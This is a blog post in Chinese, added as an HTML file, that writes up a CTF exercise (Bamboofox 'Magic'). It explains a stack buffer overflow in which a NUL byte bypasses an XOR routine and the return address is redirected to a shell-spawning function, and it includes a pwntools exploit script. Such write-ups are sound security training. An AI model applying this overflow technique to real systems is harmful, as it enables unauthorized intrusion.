@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-sena16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-sena32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-sena16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto, Noto Sans TC, Noto Sans:300,300italic,400,400italic,700,700italic|Noto Sans TC, Noto Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"twinklestar03.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(°▽°)╯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup::Bamboofox_Wargame">
+<meta property="og:url" content="https://twinklestar03.com/InfoSec/Writeup_201907_BamboofoxWargame/index.html">
+<meta property="og:site_name" content="Star&#39;s Note">
+<meta property="og:description" content="Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(°▽°)╯">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://twinklestar03.com/images/BamboofoxCTF/Magic/disass.JPG">
+<meta property="article:published_time" content="2019-07-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-18T16:31:31.353Z">
+<meta property="article:author" content="TwinkleStar03">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="BamboofoxCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twinklestar03.com/images/BamboofoxCTF/Magic/disass.JPG">
+
+<link rel="canonical" href="https://twinklestar03.com/InfoSec/Writeup_201907_BamboofoxWargame/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>Writeup::Bamboofox_Wargame | Star's Note</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-142199198-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-142199198-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Star's Note" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Star's Note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">星筆記</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>歸檔</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://twinklestar03.com/InfoSec/Writeup_201907_BamboofoxWargame/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_sena.png">
+      <meta itemprop="name" content="TwinkleStar03">
+      <meta itemprop="description" content="ヾ(≧▽≦*)o Pwning my world<br>InfoSec // CTFer // Robotics<br>">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Star's Note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Writeup::Bamboofox_Wargame
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+
+              <time title="創建時間：2019-07-21 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-21T00:00:00+08:00">2019-07-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新於</span>
+                <time title="修改時間：2021-01-19 00:31:31" itemprop="dateModified" datetime="2021-01-19T00:31:31+08:00">2021-01-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分類於</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/InfoSec/" itemprop="url" rel="index"><span itemprop="name">InfoSec</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Bamboofox CTF解題記錄，一如往常地到處找題目增進自己打CTF的戰力╰(<em>°▽°</em>)╯</p>
+<a id="more"></a>
+
+<p>我選擇先從<a target="_blank" rel="noopener" href="https://bamboofox.cs.nctu.edu.tw/courses/2/challenges">這裡</a>開始做</p>
+<hr>
+<h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><hr>
+<h2 id="Wargame-0-1-Magic-100"><a href="#Wargame-0-1-Magic-100" class="headerlink" title="Wargame 0-1 Magic [100]"></a>Wargame 0-1 Magic [100]</h2><blockquote>
+<p>Description<br>Do you believe in magic?</p>
+</blockquote>
+<blockquote>
+<p>Hint<br>Stack buffer overflow</p>
+</blockquote>
+<p>拿到檔案，magic: ELF 32-bit LSB executable，提示已經告知是Stack buffer overflow了，所以我直接IDA拆開來看了。</p>
+<p><img src="/images/BamboofoxCTF/Magic/disass.JPG" alt="有漏洞的函式Magic()"><br>然後還有一個never_use()可以用來開shell，所以題目應該是希望我們把ret address指到該函式。</p>
+<p>從<code>ax, [ebp-44h]</code>可知buffer大小是0x44，然後因為<code>mov     dword ptr [esp], offset aS ; &quot;%s&quot;</code>可知scanf()的格式化參數是%s，所以可以用垃圾把Buffer塞爆。</p>
+<p>已經了解Buffer overflow成立之後就來建構payload吧! </p>
+<p>需要塞0x44個byte進去把Buffer塞滿，這樣做之後會頂到ebp，所以在額外塞0x4個byte頂過ebp，這邊開始就是return address了! 蓋上never_use()的記憶體位置完成攻擊~<br>Payload: 0x48個byte + never_use()的位置</p>
+<p>其實這樣攻擊是不會成功的，因為還有一個函式被忽略了，do_magic()，題目直接給出source</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        srand(time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">        do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果不對do_magic進行繞過，那payload會直接跟亂數XOR變成垃圾QQ</p>
+<p>由呼叫do_magic的地方可知控制XOR的次數是透過strlen()，這個函式會計算字串的字元數，停下來的方法是讀到一個\x00，那我們就提早讓他停下來就好!</p>
+<p>所以payload變成: 0x1個byte + \x00 + (0x44 + 0x4 - 0x2) + never_use()的位置</p>
+<figure class="highlight python"><figcaption><span>Payload.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./magic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">70</span> + p32(<span class="number">0x8048613</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>喜歡這些內容嗎? 歡迎訂閱我的部落格!</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
+              <a href="/tags/BamboofoxCTF/" rel="tag"># BamboofoxCTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Algorithm/UVa1584_CircularSequence/" rel="prev" title="UVa1584-CircularSequence">
+      <i class="fa fa-chevron-left"></i> UVa1584-CircularSequence
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/Algorithm/Algorithm_EditDistance/" rel="next" title="Algorithm::Levenshtein distance(Edit Distance)">
+      Algorithm::Levenshtein distance(Edit Distance) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Writeup"><span class="nav-number">1.</span> <span class="nav-text">Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Wargame-0-1-Magic-100"><span class="nav-number">1.1.</span> <span class="nav-text">Wargame 0-1 Magic [100]</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="TwinkleStar03"
+      src="/images/avatar_sena.png">
+  <p class="site-author-name" itemprop="name">TwinkleStar03</p>
+  <div class="site-description" itemprop="description">ヾ(≧▽≦*)o Pwning my world<br>InfoSec // CTFer // Robotics<br></div>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:star@twinklestar03.com" title="E-mail → mailto:star@twinklestar03.com"><i class="fa fa-envelope fa-fw"></i>E-mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/star12465/" title="Facebook → https:&#x2F;&#x2F;www.facebook.com&#x2F;star12465&#x2F;" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>Facebook</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TwinkleStar03</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
